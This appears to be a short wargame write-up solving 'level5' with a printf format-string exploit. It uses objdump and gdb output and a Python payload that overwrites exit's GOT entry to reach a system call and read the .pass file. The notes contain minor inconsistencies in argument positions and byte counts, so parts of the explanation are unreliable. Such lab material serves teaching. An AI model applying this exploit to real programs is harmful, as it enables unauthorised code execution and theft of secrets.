We look at the GOT table and find the address of <exit>

$ objdump -R ./level5
...
08049838 R_386_JUMP_SLOT   exit
...

The function <o> calls <system> but is never executed

$ (gdb) disas o
...
0x080484b1 <+13>:	call   0x80483b0 <system@plt>
...

The idea is to replace the call to <exit> in the <n> function by a call to <o>
Playing around with printf we notice that we control the 4th argument on the stack.
But, we cannot pipe 134513828 bytes at once so we split the value 0x080484a4 into 0x0804 (2052) and 0x84a4 (33956)

The formula is then :
	<addr+2>		: for the high part of the target address
	<addr>			: for the low part of the target address
	<2052-8)>		: 0x0804 minus the 8 bytes of the 1st address
	<%4$hn>			: write it at 1st address as 12th argument on the stack
	<33956-2044)>	: 0x84a4 minus the 2044 bytes already printed
	<%5$hn>			: write it at 2nd address as 13th argument on the stack

Then launch the terminal and get access to .pass file

$ cat <(python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044d' + '%4\$hn' + '%31904d' + '%5\$hn')") - | ./level5
